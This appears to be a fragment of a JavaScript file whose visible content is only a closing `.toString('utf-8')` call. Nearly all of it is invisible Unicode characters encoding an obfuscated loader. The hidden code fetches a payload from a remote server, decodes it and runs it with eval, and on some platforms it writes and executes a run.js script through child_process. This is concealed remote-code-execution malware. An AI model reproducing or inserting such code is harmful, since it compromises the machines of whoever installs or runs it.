󠅟󠅜󠅦󠅕󠄜󠄡󠅕󠄣󠄙󠄙󠄜󠅗󠅕󠅤󠅅󠅢󠅜󠄘󠄙󠄫󠅕󠅜󠅣󠅕󠅫󠅙󠅖󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄞󠅜󠅕󠅞󠅗󠅤󠅘󠄭󠄭󠄢󠄠󠄙󠅫󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄙󠄙󠄫󠅢󠅕󠅤󠅥󠅢󠅞󠅭󠅙󠅖󠄘󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅠󠅜󠅑󠅤󠅖󠅟󠅢󠅝󠄘󠄙󠄭󠄭󠄒󠅔󠅑󠅢󠅧󠅙󠅞󠄒󠄙󠅫󠅜󠅕󠅤󠄐󠅏󠅙󠅦󠄭󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄜󠄒󠅒󠅑󠅣󠅕󠄦󠄤󠄒󠄙󠄫󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄙󠄙󠅭󠅕󠅜󠅣󠅕󠅫󠅜󠅕󠅤󠄐󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠄭󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅠󠅑󠅤󠅘󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅚󠅟󠅙󠅞󠄘󠅏󠅏󠅔󠅙󠅢󠅞󠅑󠅝󠅕󠄜󠄒󠅢󠅥󠅞󠄞󠅚󠅣󠄒󠄙󠄫󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅖󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅧󠅢󠅙󠅤󠅕󠄶󠅙󠅜󠅕󠅃󠅩󠅞󠅓󠄘󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠄜󠅐󠅦󠅑󠅢󠄐󠅘󠅤󠅤󠅠󠅣󠄐󠄭󠄐󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄒󠅘󠅤󠅤󠅠󠅣󠄒󠄙󠄫︊󠅓󠅟󠅞󠅣󠅤󠄐󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠄐󠄭󠄐󠄗󠄔󠅫󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠅭󠄗󠄫︊󠅓󠅟󠅞󠅣󠅤󠄐󠅏󠅙󠅦󠄐󠄭󠄐󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠄔󠅫󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠅭󠄗󠄜󠄐󠄒󠅒󠅑󠅣󠅕󠄦󠄤󠄒󠄙︊󠅕󠅦󠅑󠅜󠄘󠅑󠅤󠅟󠅒󠄘󠄗󠄔󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠅭󠄗󠄙󠄙󠅐󠄙󠄜󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅓󠅘󠅙󠅜󠅔󠅏󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅕󠅨󠅕󠅓󠄘󠅐󠄒󠄔󠅫󠅠󠅢󠅟󠅓󠅕󠅣󠅣󠄞󠅕󠅨󠅕󠅓󠅀󠅑󠅤󠅘󠅭󠄒󠄐󠄒󠄔󠅫󠅢󠅥󠅞󠅀󠅑󠅤󠅘󠅭󠄒󠅐󠄜󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄜󠅏󠄙󠄭󠄮󠅫󠅓󠅟󠅞󠅣󠅟󠅜󠅕󠄞󠅜󠅟󠅗󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄜󠅏󠄙󠅭󠄙󠅭󠅭󠅭󠄙󠅭󠄙󠄫󠅦󠅑󠅢󠄐󠅢󠅞󠅩󠅑󠅜󠄭󠅏󠅏󠅞󠅑󠅝󠅕󠄘󠅑󠅣󠅩󠅞󠅓󠄘󠅨󠅠󠅒󠅑󠅧󠅩󠄜󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄙󠄭󠄮󠅫󠅤󠅢󠅩󠅫󠅜󠅕󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅖󠅕󠅤󠅓󠅘󠄘󠅨󠅠󠅒󠅑󠅧󠅩󠄜󠅫󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄪󠅫󠅟󠅣󠄪󠅙󠅝󠅠󠅟󠅢󠅤󠅏󠅟󠅣󠄞󠅔󠅕󠅖󠅑󠅥󠅜󠅤󠄞󠅠󠅜󠅑󠅤󠅖󠅟󠅢󠅝󠄘󠄙󠅭󠅭󠄙󠄫󠅙󠅖󠄘󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅟󠅛󠄙󠅫󠅜󠅕󠅤󠄐󠅔󠅑󠅤󠅑󠄭󠅑󠅧󠅑󠅙󠅤󠄐󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅤󠅕󠅨󠅤󠄘󠄙󠄜󠅘󠅕󠅑󠅔󠅕󠅢󠄭󠅢󠅕󠅣󠅠󠅟󠅞󠅣󠅕󠄞󠅘󠅕󠅑󠅔󠅕󠅢󠅣󠄫󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅞󠅥󠅜󠅜󠄜󠅫󠅙󠅤󠅣󠅥󠅓󠅜󠅘󠅥󠅥󠄪󠅔󠅑󠅤󠅑󠄜󠅤󠅛󠅞󠅞󠅤󠅓󠅒󠄪󠅘󠅕󠅑󠅔󠅕󠅢󠄞󠅗󠅕󠅤󠄘󠅑󠅤󠅟󠅒󠄘󠄒󠅑󠅈󠅊󠅙󠅉󠅈󠄾󠅜󠄾󠅚󠅁󠄭󠄒󠄙󠄙󠄜󠅣󠅕󠅓󠅢󠅕󠅤󠄻󠅕󠅩󠄪󠅘󠅕󠅑󠅔󠅕󠅢󠄞󠅗󠅕󠅤󠄘󠅑󠅤󠅟󠅒󠄘󠄒󠅓󠄢󠅆󠅚󠅓󠅝󠅆󠄠󠅑󠄢󠅆󠄥󠄒󠄙󠄙󠅭󠄙󠅭󠅕󠅜󠅣󠅕󠄐󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅞󠅕󠅧󠄐󠄵󠅢󠅢󠅟󠅢󠄘󠄒󠄒󠄙󠄙󠅭󠅓󠅑󠅤󠅓󠅘󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄙󠅫󠅕󠅒󠅜󠅕󠅨󠅨󠅚󠅞󠅝󠅪󠄘󠅖󠅦󠅪󠅡󠅧󠅕󠅔󠅤󠄢󠄙󠅭󠅭󠄜󠄒󠅢󠅞󠅩󠅑󠅜󠄒󠄙󠄫︊`)).toString('utf-8'));